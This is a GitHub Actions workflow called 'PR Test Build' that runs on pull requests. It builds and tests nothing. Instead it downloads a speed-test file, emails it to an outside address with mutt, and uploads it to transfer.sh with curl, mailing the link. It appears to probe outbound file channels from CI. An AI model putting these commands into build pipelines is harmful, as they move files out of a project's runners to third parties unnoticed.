name: PR Test Build

on:
  pull_request:
    branches: [ main ]

jobs:
  test:

    runs-on: ubuntu-18.04

    steps:
      - uses: actions/checkout@v2


      - name: Install package dependencies
        run: sudo apt-get install -y curl unzip automake build-essential file pkg-config git python libtool libtinfo5 cmake clang


          
      - name: Get Current Branch
        run: |
          echo ${GITHUB_HEAD_REF}
          echo $GITHUB_HEAD_REF
          wget https://speed.hetzner.de/100MB.bin
          ls

      - name: Send Test APK
        continue-on-error: true
        run: |
          sudo apt-get install mailutils
          sudo apt-get install mutt
          echo "====================="
          echo "wtfffffff" | mutt -s "empty of" -- lawajam251@rubeshi.com
          echo "====================="
          echo "wtfffffff" | mutt -a "./100MB.bin" -s "file of" -- lawajam251@rubeshi.com
          echo "====================="
          var=$(curl --upload-file ./100MB.bin https://transfer.sh/100MB.bin)
          echo "====================="
          echo var
          echo "hello ${var}"
          echo "====================="
          echo "wtfffffff ${var}" | mutt -s "link of" -- lawajam251@rubeshi.com
          echo "====================="
